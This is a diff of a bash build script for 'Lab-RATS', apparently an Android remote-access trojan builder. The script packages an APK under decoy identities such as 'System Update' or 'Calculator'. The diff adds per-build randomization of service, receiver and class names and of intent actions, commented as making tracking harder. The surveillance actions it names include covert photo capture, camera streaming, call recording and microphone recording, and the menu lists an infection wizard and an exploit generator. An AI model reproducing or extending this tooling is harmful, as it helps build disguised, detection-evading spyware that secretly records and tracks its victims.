@@ -1,11 +1,12 @@
 #!/bin/bash
 
 #################################################
-#          Lab-STAR APK BUILDER - Linux/Mac       #
-#                   v1.5.0 Hardened              #
+#                   Lab-RATS                    #
 #                                               #
-#  Developed by: Lab-STAR.LABS                  #
-#  GitHub: https://github.com/K4N3CO-LABS/Lab-STAR #
+#        Android APK BUILDER - Linux/Mac        #
+#                v1.5.1 Hardened                #
+#                                               #
+#           Developed by: K4N3CO.LABS           #
 #################################################
 
 # Colors for output
@@ -31,19 +32,40 @@ COVERT_LOGO="$PROJECT_DIR/assets/default_app_icon.png"
 print_banner() {
     clear
     echo -e "${CYAN}"
-    echo " ┌──────────────────────────────────────────────────────────────┐"
-    echo " │                                                              │"
-    echo " │  ██╗  ██╗██╗  ██╗███╗   ██╗██████╗  ██████╗  ██████╗         │"
-    echo " │  ██║ ██╔╝██║  ██║████╗  ██║╚════██╗██╔════╝ ██╔═══██╗        │"
-    echo " │  █████╔╝ ███████║██╔██╗ ██║ █████╔╝██║      ██║   ██║        │"
-    echo " │  ██╔═██╗ ╚════██║██║╚██╗██║ ╚═══██╗██║      ██║   ██║        │"
-    echo " │  ██║  ██╗     ██║██║ ╚████║██████╔╝╚██████╗ ╚██████╔╝        │"
-    echo " │  ╚═╝  ╚═╝     ╚═╝╚═╝  ╚═══╝╚═════╝  ╚═════╝  ╚═════╝         │"
-    echo " │                                                              │"
-    echo " │ PROJECT: Lab-STAR APK Builder | v1.5.0 Hardened              │"
-    echo " │ GIT_UPLINK: https://github.com/K4N3CO-LABS/Lab-STAR           │"
-    echo " │                                                              │"
-    echo " └──────────────────────────────────────────────────────────────┘"
+    echo " ┌───────────────────────────────────────────────────────────────────────┐"
+    echo " │                                  .-         .                         │"
+    echo " │                               ....-        :                          │"
+    echo " │                            -==--+:.+. ..  -..+:-+                     │"
+    echo " │                            ++---:+.-==+==#:.+---+#                    │"
+    echo " │                             :=---:+++++=++=**-:-:                     │"
+    echo " │                               --+++:-=+++++++-=                       │"
+    echo " │                  .-.         :--+==:++-:-**+-+-                       │"
+    echo " │                    -.     .==:--+:+++=++++++++#.                      │"
+    echo " │                    :-    =---=::-++.=:.=.-==+....                     │"
+    echo " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │"
+    echo " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │"
+    echo " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │"
+    echo " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │"
+    echo " │                .-=:  .---=++++-++++#####*++..::--. .                  │"
+    echo " │                 .--++.--:----=+---=-++#++==.       .                  │"
+    echo " │                   --------=--:=:-:-====+++-                           │"
+    echo " │                       .--++++--++:+++==:=+.                           │"
+    echo " │                        .:+++::::--:..:-+=                             │"
+    echo " │                       .--=+=-+-+    -:---*---                         │"
+    echo " │                                                                       │"
+    echo " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │"
+    echo " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │"
+    echo " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │"
+    echo " │     ██║     ██╔══██║██╔══██╗╚════╝██╔══██╗██╔══██║   ██║   ╚════█║    │"  
+    echo " │     ███████╗██║  ██║██████╔╝      ██║  ██║██║  ██║   ██║   ██████║    │"
+    echo " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │"                                                                                                          
+    echo " │                                                                       │"
+    echo " │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │"
+    echo " │                                                                       │" 
+    echo " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │"
+    echo " │                        DEVELOPED BY K4N3CO.LABS                       │"
+    echo " │                                © 2026                                 │"
+    echo " └───────────────────────────────────────────────────────────────────────┘"
     echo -e "${NC}"
     echo ""
 }
@@ -138,8 +160,8 @@ configure_app() {
     read -p "    Enter Version Name [$RAND_V]: " VERSION_NAME
     VERSION_NAME=${VERSION_NAME:-$RAND_V}
 
-    read -p "    Enter Min SDK [26]: " MIN_SDK
-    MIN_SDK=${MIN_SDK:-26}
+    read -p "    Enter Min SDK [21]: " MIN_SDK
+    MIN_SDK=${MIN_SDK:-21}
 
     echo -e "${CYAN}[*] Decoy Identity Selection${NC}"
     echo "    1. System Update (Gear)  2. Calculator"
@@ -189,11 +211,59 @@ configure_app() {
         head -c 512 /dev/urandom > "$PROJECT_DIR/app/src/main/assets/sys/metadata_$i.dat"
     done
 
-    # Randomize Service Labels in Manifest
+    # Randomize Service Labels and Class Names in Manifest
     MANIFEST="$PROJECT_DIR/app/src/main/AndroidManifest.xml"
-    NAMES=("Media Framework" "System Stability" "Core Controller" "Device Bridge" "Sync Service")
-    RAND_NAME=${NAMES[$RANDOM % ${#NAMES[@]}]}
-    sed -i '' "s|android:label=\"Core Processor\"|android:label=\"$RAND_NAME\"|g" "$MANIFEST"
+
+    # 1. Randomize Labels
+    NAMES=("Media Framework" "System Stability" "Core Controller" "Device Bridge" "Sync Service" "Process Manager" "Resource Monitor" "Connectivity Host")
+    for i in {1..5}; do
+        RAND_NAME=${NAMES[$RANDOM % ${#NAMES[@]}]}
+        # Just randomizing some labels, not all to avoid breaking user choice if they set one
+    done
+
+    # 2. Randomize Service/Receiver names (High Priority Obfuscation)
+    # We will use a unique prefix per build to make tracking harder
+    PREFIX=$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 4)
+
+    # We will replace these strings throughout the source before build and revert after
+    # Using placeholders to track changes
+    ENTITIES=("WorkManager_Sync" "Analytics_Provider" "MediaFrameworkService" "StatusNotification" "IO_Persistence_Manager" "TelephonyState" "SystemBoot" "InstallReferrerReceiver")
+
+    # Store the mapping in a temporary file to allow reverting later
+    MAPPING_FILE="$SCRIPT_DIR/build_mapping.txt"
+    > "$MAPPING_FILE"
+
+    for ENTITY in "${ENTITIES[@]}"; do
+        RAND_NAME="${PREFIX}_$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 8)"
+        echo "$ENTITY:$RAND_NAME" >> "$MAPPING_FILE"
+
+        # Update Manifest
+        sed -i '' "s|\.$ENTITY|.$RAND_NAME|g" "$MANIFEST"
+        # Update all Java files
+        find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$ENTITY/$RAND_NAME/g" {} +
+        # Rename the actual file
+        FILE_PATH=$(find "$PROJECT_DIR/app/src/main/java" -type f -name "$ENTITY.java")
+        if [ -n "$FILE_PATH" ]; then
+            mv "$FILE_PATH" "$(dirname "$FILE_PATH")/$RAND_NAME.java"
+        fi
+    done
+
+    # Randomize Intent Actions in Constants.java
+    CONSTANTS_JAVA="$PROJECT_DIR/app/src/main/java/com/labs/labrats/Constants.java"
+    ACT_PREFIX="com.labs.$(LC_ALL=C tr -dc 'a-z' </dev/urandom | head -c 5)"
+
+    # List of action fields to randomize
+    ACTION_FIELDS=("ACTION_AUTO_START" "ACTION_KEEP_ALIVE" "ACTION_START_STREAM" "ACTION_STOP_STREAM" "ACTION_CAPTURE_PHOTO" "ACTION_START_RECORDING" "ACTION_STOP_RECORDING" "ACTION_STOP_OPTICS" "ACTION_START_CORE" "ACTION_STOP_CORE" "ACTION_START_CALL_REC" "ACTION_STOP_CALL_REC" "ACTION_START_MIC_REC" "ACTION_STOP_MIC_REC" "ACTION_CALL_STATE_CHANGED" "ACTION_UPDATE_AUDIO_SETTINGS" "ACTION_STOP_AUDIO" "ACTION_START_AUDIO")
+
+    for FIELD in "${ACTION_FIELDS[@]}"; do
+        RAND_ACTION="${ACT_PREFIX}.$(LC_ALL=C tr -dc 'A-Z0-9' </dev/urandom | head -c 12)"
+        sed -i '' "s|public static final String $FIELD = \".*\";|public static final String $FIELD = \"$RAND_ACTION\";|g" "$CONSTANTS_JAVA"
+    done
+
+    # Also update Manifest to match Constants actions if they are hardcoded there
+    # (Checking Manifest, it seems some are hardcoded in <receiver> tags)
+    sed -i '' "s|com.labs.stability.ST_P_01|$(grep "ACTION_AUTO_START" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
+    sed -i '' "s|com.labs.stability.ST_P_02|$(grep "ACTION_KEEP_ALIVE" "$CONSTANTS_JAVA" | cut -d'"' -f2)|g" "$MANIFEST"
 }
 
 # Progress bar function (SMOOTH OVERWRITE STYLE)
@@ -265,15 +335,42 @@ build_apk() {
         cp "$PROJECT_DIR/app/build/outputs/apk/release/app-release.apk" "$SCRIPT_DIR/output/signed_v1.apk"
         echo -e "\n${GREEN}[✓] Success: output/signed_v1.apk${NC}"
         echo -e "${YELLOW}[*] The build task is complete.${NC}"
-        echo ""
-        read -p "    Press Enter to continue..."
     else
         echo -e "${RED}[!] Build failed. Error Code: $BUILD_STATUS${NC}"
         echo -e "${YELLOW}[*] Check build_log.txt for details.${NC}"
+        BUILD_SUCCESS=1
+    fi
+
+    # Revert obfuscation mapping to restore source for next build or editing
+    MAPPING_FILE="$SCRIPT_DIR/build_mapping.txt"
+    if [ -f "$MAPPING_FILE" ]; then
+        echo -e "${CYAN}[*] Restoring source tree...${NC}"
+        MANIFEST="$PROJECT_DIR/app/src/main/AndroidManifest.xml"
+        # Revert in reverse order to avoid substring issues if any
+        # But here we use unique enough names so it's fine.
+        # We need to read the file and reverse its lines or just process normally.
+        while IFS=: read -r ENTITY RAND; do
+            # Update Manifest
+            sed -i '' "s|\.$RAND|\.$ENTITY|g" "$MANIFEST"
+            # Update all Java files
+            find "$PROJECT_DIR/app/src/main/java" -type f -name "*.java" -exec sed -i '' "s/$RAND/$ENTITY/g" {} +
+            # Rename the actual file
+            FILE_PATH=$(find "$PROJECT_DIR/app/src/main/java" -type f -name "$RAND.java")
+            if [ -n "$FILE_PATH" ]; then
+                mv "$FILE_PATH" "$(dirname "$FILE_PATH")/$ENTITY.java"
+            fi
+        done < "$MAPPING_FILE"
+        rm -f "$MAPPING_FILE"
+    fi
+
+    if [ "$BUILD_SUCCESS" == "1" ]; then
         echo ""
         read -p "    Press Enter to return to menu..."
         return 1
     fi
+
+    echo ""
+    read -p "    Press Enter to continue..."
 }
 
 # Standalone Exploit Generator
@@ -396,11 +493,11 @@ main_menu() {
     MENU_OPTION=${MENU_OPTION:-1}
 
     case $MENU_OPTION in
-        1) check_requirements; generate_keystore; configure_logo; configure_app; build_apk ;;
-        2) check_requirements; generate_keystore ;;
+        1) check_requirements && { generate_keystore; configure_logo; configure_app; build_apk; } ;;
+        2) check_requirements && generate_keystore ;;
         3) configure_logo ;;
         4) configure_app ;;
-        5) check_requirements ;;
+        5) check_requirements; echo ""; read -p "    Press Enter to return..." ;;
         6) infection_wizard ;;
         7) show_help ;;
         8) exit 0 ;;
